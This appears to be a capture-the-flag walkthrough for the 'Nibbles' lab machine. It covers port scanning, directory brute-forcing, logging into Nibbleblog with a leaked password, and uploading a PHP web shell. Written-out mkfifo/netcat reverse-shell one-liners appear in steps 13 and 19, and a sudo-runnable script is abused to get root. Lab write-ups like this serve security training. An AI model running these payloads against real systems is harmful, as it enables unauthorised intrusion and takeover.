# Nibbles

1. Nmap scan for default open ports and ouput all formats:
```
nmap -sV --open -oA nibbles_initial_scan 10.129.200.170

Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 05:18 BST
Nmap scan report for 10.129.200.170
Host is up (0.028s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.59 seconds
```

2. Nmap scan for all open ports and output all formats:
```
nmap -p- --open -oA nibbles_full_tcp_scan 10.129.200.170

Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 05:19 BST
Nmap scan report for 10.129.200.170
Host is up (0.060s latency).
Not shown: 60794 closed tcp ports (conn-refused), 4739 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 34.33 seconds

```

3. Nmap script scan:
```
nmap -sC -p22,80 -oA nibbles_script_scan 10.129.200.170

Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 05:22 BST
Nmap scan report for 10.129.200.170
Host is up (0.0045s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   2048 c4f8ade8f8047decf150d630a187e49 (RSA)
|   256 228fb197bf0f170fc7e2c8fe9773a48 (ECDSA)
|_  256 e6ac27a3b5a9f113c34a55d5beb3de9 (ED25519)
80/tcp open  http
|_http-title: Site doesn't have a title (text/html).

Nmap done: 1 IP address (1 host up) scanned in 0.57 seconds

```

4. Nmap enumeration using the [http-enum script](https://nmap.org/nsedoc/scripts/http-enum.html):
```
nmap -sV --script=http-enum -oA nibbles_nmap_http_enum 10.129.200.170

Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-30 05:26 BST
Nmap scan report for 10.129.200.170
Host is up (0.027s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.91 seconds
```

5. Banner grab with `netcat` on both the ports:
```
nc -nv 10.129.200.170 80
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 10.129.200.170:80.
^C

nc -nv 10.129.200.170 22
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 10.129.200.170:22.
SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.2
```

6. `whatweb` to identify the web application in use:
```
whatweb 10.129.200.170

http://10.129.200.170 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.200.170]
```

7. Check the web application using curl:
```
curl 10.129.200.170

<b>Hello world!</b>

<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

8. Using `whatweb` check the /nibbleblog/ directory obtained from the previous step:
```
whatweb 10.129.200.170/nibbleblog

http://10.129.200.170/nibbleblog [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.200.170], RedirectLocation[http://10.129.200.170/nibbleblog/], Title[301 Moved Permanently]
http://10.129.200.170/nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.200.170], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```

9. Quick Google search for Nibbleblog exploit gets use [Nibbleblog File Upload Vulnerability](https://www.rapid7.com/db/modules/exploit/multi/http/nibbleblog_file_upload/).

10. Quick directory brute force:
```
gobuster dir -u http://10.129.200.170/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.200.170/nibbleblog/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/05/30 05:38:14 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 304]
/.htaccess            (Status: 403) [Size: 309]
/admin                (Status: 301) [Size: 327] [--> http://10.129.200.170/nibbleblog/admin/]
/admin.php            (Status: 200) [Size: 1401]                                             
/.htpasswd            (Status: 403) [Size: 309]                                              
/content              (Status: 301) [Size: 329] [--> http://10.129.200.170/nibbleblog/content/]
/index.php            (Status: 200) [Size: 2987]                                               
/languages            (Status: 301) [Size: 331] [--> http://10.129.200.170/nibbleblog/languages/]
/plugins              (Status: 301) [Size: 329] [--> http://10.129.200.170/nibbleblog/plugins/]  
/README               (Status: 200) [Size: 4628]                                                 
/themes               (Status: 301) [Size: 328] [--> http://10.129.200.170/nibbleblog/themes/]   
                                                                                                 
===============================================================
2023/05/30 05:38:17 Finished
===============================================================
```

11. Running `curl` on the /nibbleblog/README page gives us the version number:
```
curl http://10.129.200.170/nibbleblog/README

====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

<SNIP>
```

12. Going to the `/admin.php` and trying out some of the following passwords does not work and blocks us out:
  - `admin:admin`
  - `admin:password`

13. Going through the `/nibbleblog/content/` directory we confirm `admin` is a valid username from `/nibbleblog/content/private/users.xml`
```
curl -s http://10.129.200.170/nibbleblog/content/private/users.xml | xmllint  --format -
```    

14. Going through the `/nibbleblog/content/` directory we confirm `nibbles` is a valid passowrd from `/nibbleblog/content/private/config.xml`
```
curl -s http://10.129.200.170/nibbleblog/content/private/config.xml | xmllint  --format -
```

15. Once logged into the admin portal using `admin:nibbles` we go through all the links and find `My Image` plugin uses the file upload feature.

16. Using the information from the previous steps we create a `.php` file with the following contents and upload it using the upload feature:
```
<?php system('id'); ?>
```

17. From the dir bruteforce information we gathered earlier we remember that there is a `/nibbleblog/content/private/plugins/my_image/` directory. Going to this directory we find our uploaded file. At this point we have gained RCE on the server and the Apache web server is running in the `nibbler`context.
```
curl http://10.129.200.170/nibbleblog/content/private/plugins/my_image/image.php
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

13. We update the `.php` file with the following to give us a reverse shell:
```
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <OUR_IP> <PORT> >/tmp/f"); ?>
``` 

14. Started a `netcat` listener on our local host:
```
nc -lvnp 9443
```

15. When we visit the uploaded file our listener catches the reverse shell. Since it is not a fully interactive TTY we upgrade it using the following command in the shell:
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

16. In the `nibbler` users home directory we find `user.txt` and `personal.zip`.

17. After unzipping the `personal.zip` we find `monitor.sh`. Leaving that aside for now we perform some automated privesc by download [LinEnum.sh](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) on our local machine and serve it using the following command:
```
sudo python3 -m http.server 8080
```

18. Using `wget` on the remote host we get the serverd `LinEnum.sh` file and change it to be executable and run it:
```
chmod +x LinEnum.sh
./LinEnum.sh
```

19. From the output of the previous command we learn that `nibbler` users is able to run `monitor.sh` as `root`. So we append a reverse-shell one-liner to `monitor.sh` and execute (Before executing it we will have a `nc` listener on our local machine).
```
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.74 8443 >/tmp/f' | tee -a monitor.sh

sudo /home/nibbler/personal/stuff/monitor.sh 
```

20. Once `monitor.sh` executes our listener catches the reverse shell. Which is a root shell 🎉